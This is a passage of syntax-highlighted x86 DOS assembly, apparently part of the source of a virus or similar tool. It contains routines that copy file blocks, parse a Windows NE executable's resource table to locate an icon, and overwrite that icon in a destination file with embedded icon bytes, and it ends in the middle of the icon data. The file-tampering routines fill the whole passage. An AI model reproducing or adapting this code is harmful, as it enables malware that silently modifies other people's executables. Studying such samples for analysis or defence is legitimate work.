    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">copy_file_block_error</span><span class="sc0">   </span><span class="sc1">; if not equal, then an error occured</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; size of read/written block equal</span><span class="sc0">
                    </span><span class="sc1">; to the size we planned to read?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">copy_file_block_done</span><span class="sc0">    </span><span class="sc1">; if not, we're at the end of the file</span><span class="sc0">

    </span><span class="sc6">cwde</span><span class="sc0">                            </span><span class="sc1">; convert word to dword (AX-&gt;EAX)</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">bp.bytes_to_copy</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; we've copied EAX bytes more</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">copy_file_block_loop</span><span class="sc0">    </span><span class="sc1">; copy next file block</span><span class="sc0">

</span><span class="sc5">copy_file_block_error</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">stc</span><span class="sc0">                             </span><span class="sc1">; set carry flag (indicate error)</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">copy_file_block_ret</span><span class="sc0">

</span><span class="sc5">copy_file_block_done</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0">                             </span><span class="sc1">; clear carry flag (indicate success)</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">                 </span><span class="sc1">; remove buffer from stack</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">                           </span><span class="sc1">; restore all 32bit registers</span><span class="sc0">

</span><span class="sc5">copy_file_block_ret</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">; ----- SEARCH THE ICON RESOURCE AND SET THE FILEPOINTER TO IT --------------</span><span class="sc0">

</span><span class="sc5">search_icon_resource</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">; save DS</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc0">                      </span><span class="sc1">; DS=SS</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; EAX=0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bp.rw_buffer</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; EAX=offset resource table</span><span class="sc0">
                        </span><span class="sc1">; relative to NE header</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">bp.new_header_offs</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; EAX=offset resource table</span><span class="sc0">
                      </span><span class="sc1">; relative to file start</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; CX:DX=EAX</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">                </span><span class="sc1">; set filepointer to resource table</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">go_to_resource_table_ok</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exit_search_icon_resource</span><span class="sc0">
</span><span class="sc5">go_to_resource_table_ok</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">                  </span><span class="sc1">; read resource alignment shift</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                    </span><span class="sc1">; read a word</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">bp.resource_stuff1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; DX=offset read buffer</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">read_resource_shift_ok</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exit_search_icon_resource</span><span class="sc0">
</span><span class="sc5">read_resource_shift_ok</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc5">bp.resource_stuff1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; SI=resource alignment shift</span><span class="sc0">

</span><span class="sc5">search_icon_resource_loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">                  </span><span class="sc1">; read resources type and count</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                    </span><span class="sc1">; read two words</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">bp.resource_stuff1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; DX=offset read buffer</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">read_resource_type_count_ok</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exit_search_icon_resource</span><span class="sc0">
</span><span class="sc5">read_resource_type_count_ok</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4201h</span><span class="sc0">                </span><span class="sc1">; set filepointer relative to</span><span class="sc0">
                    </span><span class="sc1">; current position</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">; CX:DX=4 (skip reserved dword</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                    </span><span class="sc1">; in TYPEINFO structure)</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">exit_search_icon_resource</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bp.resource_stuff1</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; end of TYPEINFO array?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">exit_search_icon_resource_set_carry</span><span class="sc0">  </span><span class="sc1">; then exit with error</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bp.resource_stuff1</span><span class="sc4">],</span><span class="sc2">8003h</span><span class="sc0">  </span><span class="sc1">; a icon resource?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">found_icon_resource</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">bp.resource_stuff2</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; AX=ResourceCount</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">                   </span><span class="sc1">; size of NAMEINFO struct</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">; DX:AX=size of NAMEINFO struct array</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                   </span><span class="sc1">; CX:DX=size of NAMEINFO struct array</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4201h</span><span class="sc0">                </span><span class="sc1">; set filepointer relative to</span><span class="sc0">
                    </span><span class="sc1">; current position</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">; skip all NAMEINFO array (go to next</span><span class="sc0">
                    </span><span class="sc1">; TYPEINFO element).</span><span class="sc0">

    </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">exit_search_icon_resource</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">search_icon_resource_loop</span><span class="sc0">  </span><span class="sc1">; check next TYPEINFO element</span><span class="sc0">

</span><span class="sc5">found_icon_resource</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc5">bp.resource_stuff2</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; AX=ResourceCount</span><span class="sc0">

</span><span class="sc5">search_suitable_icon</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">                  </span><span class="sc1">; read start of NAMEINFO struct</span><span class="sc0">
                    </span><span class="sc1">; (offset and length)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                    </span><span class="sc1">; read two words</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">bp.resource_stuff1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; DX=offset read buffer</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">exit_search_icon_resource</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; EAX=0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">bp.resource_stuff2</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; EAX=resource length (aligned)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                   </span><span class="sc1">; CX=resource alignment shift</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                  </span><span class="sc1">; EAX=resource length (bytes)</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">744</span><span class="sc0">                 </span><span class="sc1">; is it big enough?</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">set_filepointer_to_resource</span><span class="sc0">  </span><span class="sc1">; if yes, then use it!</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4201h</span><span class="sc0">                </span><span class="sc1">; set filepointer relative to th</span><span class="sc0">
                    </span><span class="sc1">; current position</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">; CX:DX=8 (skip rest of this NAMEINFO</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                    </span><span class="sc1">; structure)</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">exit_search_icon_resource</span><span class="sc0">

    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">                      </span><span class="sc1">; decrement resource counter</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">search_suitable_icon</span><span class="sc0">    </span><span class="sc1">; if counter not zero, search on</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">search_icon_resource_loop</span><span class="sc0">  </span><span class="sc1">; otherwise we failed</span><span class="sc0">

</span><span class="sc5">set_filepointer_to_resource</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; EAX=0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">bp.resource_stuff1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; EAX=resource offset (aligned)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                   </span><span class="sc1">; CX=resource alignment shift</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                  </span><span class="sc1">; EAX=resource offset (bytes)</span><span class="sc0">
</span><span class="sc1">;*      add     eax,104                 ; skip header</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc4">,</span><span class="sc2">68h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; fixup - byte match</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; CX:DX=EAX</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">                </span><span class="sc1">; go to icon resource in file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">bp.dest_handle</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX=file handle</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exit_search_icon_resource</span><span class="sc0">  </span><span class="sc1">; done!</span><span class="sc0">

</span><span class="sc5">exit_search_icon_resource_set_carry</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">stc</span><span class="sc0">                             </span><span class="sc1">; set carry flag (indicate error)</span><span class="sc0">

</span><span class="sc5">exit_search_icon_resource</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">; ----- WRITES OUR OWN ICON TO THE FILE -------------------------------------</span><span class="sc0">

</span><span class="sc5">write_icon</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; write new icon to file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">icon_size</span><span class="sc0">            </span><span class="sc1">; CX=length to write</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">icon</span><span class="sc0">          </span><span class="sc1">; DS:DX=buffer to write</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">icon</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A2h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">005h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A2h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D5h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">082h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AAh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D5h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D5h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">057h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">005h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D5h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">025h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">050h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D5h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">052h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AAh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">045h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D5h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">054h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">025h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">052h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A2h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A2h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
